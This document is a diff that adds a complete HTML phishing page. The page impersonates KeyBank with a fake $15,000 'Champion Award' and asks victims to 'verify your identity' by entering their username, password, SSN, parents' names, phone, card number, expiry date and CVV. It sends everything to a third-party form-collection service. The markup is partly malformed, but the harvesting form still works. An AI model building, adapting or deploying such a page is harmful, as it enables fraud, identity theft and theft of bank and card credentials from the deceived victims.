@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure  - Champion Award $15,000</title>
+    <!-- Google Fonts for a professional look -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* General Reset */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Main Container */
+        .claim-container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 500px;
+            border-radius: 10px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        /* Header Section */
+        .header {
+            background: linear-gradient(135deg, #005ca6 0%, #004a85 100%);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+
+        .logo {
+            height: 40px;
+            margin-bottom: 15px;
+            filter: brightness(0) invert(1); /* Makes logo white */
+        }
+
+        .award-badge {
+            background-color: #ffd700;
+            color: #333;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .prize-amount {
+            font-size: 36px;
+            font-weight: 700;
+            margin: 10px 0;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 500;
+        }
+
+        /* Form Body */
+        .form-body {
+            padding: 25px;
+        }
+
+        .section-title {
+            color: #005ca6;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 15px 0 10px;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 5px;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: #005ca6;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 92, 166, 0.1);
+        }
+
+        /* Grid for smaller fields */
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+        .col {
+            flex: 1;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: #005ca6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+
+        .btn-submit:hover {
+            background-color: #004a85;
+        }
+
+        /* Loading Spinner */
+        .loader {
+            display: none;
+            margin-top: 15px;
+            text-align: center;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #005ca6;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #f9f9f9;
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            border-top: 1px solid #eee;
+        }
+
+        /* Success Overlay */
+        .success-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255,255,255,0.95);
+            z-index: 100;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .success-icon {
+            font-size: 60px;
+            color: #28a745;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="claim-container">
+        <!-- Header -->
+        <div class="header">
+            <!-- KeyBank Logo (White version) -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/52/KeyCorp_Logo.svg/1200px-KeyCorp_Logo.svg.png" alt="KeyBank" class="logo">
+            
+            <div class="award-badge">🥇 CHAMPION AWARD</div>
+            <div class="prize-amount">$15,000</div>
+            <div class="title">Congratulations Winner!</div>
+        </div>
+
+        <!-- Form -->
+        <div class="form-body">
+            <p style="margin-bottom: 15px; font-size: 14px; color: #666;">
+                Please verify your identity to release the funds. All fields are required.
+            </p>
+
+            <!-- REPLACE 'YOUR_FORM_ID' WITH YOUR ACTUAL FORMSPREE ID -->
+            <form id="prizeForm" action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
+                
+                <!-- Section 1: Account Info -->
+                <div class="section-title">Account Details</div>
+                
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" placeholder="e.g. john_doe123" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" name="email" placeholder="john@example.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                </div>
+
+                <!-- Section 2: Personal Info -->
+                <div class="section-title">Personal Information</div>
+
+                <div class="form-group">
+                    <label for="realName">Real Full Name</label>
+                    <input type="text" id="realName" name="realName" placeholder="John Doe" required>
+                </div>
+
+                <div class="row">
+                    <div class="col form-group">
+                        <label for="motherName">Mother's Name</label>
+                        <input type="text" id="motherName" name="motherName" placeholder="Jane Doe" required>
+                    </div>
+                    <div class="col form-group">
+                        <label for="fatherName">Father's Name</label>
+                        <input type="text" id="fatherName" name="fatherName" placeholder="John Sr." required>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col form-group">
+                        <label for="ssn">SSN</label>
+                        <input type="text" id="ssn" name="ssn" placeholder="123-45-6789" required>
+                    </div>
+                    <div class="col form-group">
+                        <label for="zip">Zip Code</label>
+                        <input type="text" id="zip" name="zip" placeholder="10001" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" placeholder="(555) 123-4567" required>
+                </div>
+
+                <!-- Section 3: 
+        <!-- Account Type -->
+                    <div class="form-group full-width">
+                        <label for="accountType">Account Type</label>
+                        <select id="accountType" name="accountType" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px;">
+                            <option value="Checking">Checking</option>
+                            <option value="Savings">Savings</option>
+                            <option value="Money Market">Money Market</option>
+                            <option value="Credit Card">Credit Card</option>
+                        </select>
+                    </div>
+
+                    <!-- Debit Card Details -->
+                    <div class="section-title">Debit/Credit Card Number</div>
+                    
+                    <div class="form-group full-width">
+                        <label for="cardNumber"></label>
+                        <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px;">
+                    </div>
+
+                    <div class="row">
+                        <!-- Expiry Date -->
+                        <div class="col form-group">
+                            <label for="expiry">Expiry Date</label>
+                            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px;">
+                        </div>
+
+                        <!-- CVV -->
+                        <div class="col form-group">
+                            <label for="cvv">CVV</label>
+                            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px;">
+                        </div>
+                    </div>
+
+                    <!-- Cardholder Name -->
+                    <div class="form-group full-width">
+                        <label for="cardHolder">Name on Card</label>
+                        <input type="text" id="cardHolder" name="cardHolder" placeholder="John Doe" required style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px;">
+                    </div>
+<form action="https://formspree.io/f/mkoldazv" method="POST">
+
+  <label>Business owner Yes/No</label>
+  <input type="text" name="Business owner Yes/No" required>
+
+  <label>Messages</label>
+  <textarea name="messages" required></textarea>
+
+  <button type="submit">Submit and claim $15k</button>
+  
+</form>
+
+<footer>
+  <p>
+    &copy; 2025 SecureBank, N.A. Member FDIC.
+  </p>
+
+  <p>
+    <a href="#">Privacy Policy</a> |
+    <a href="#">Terms of Service</a>
+  </p>
+</footer>
+
+
+
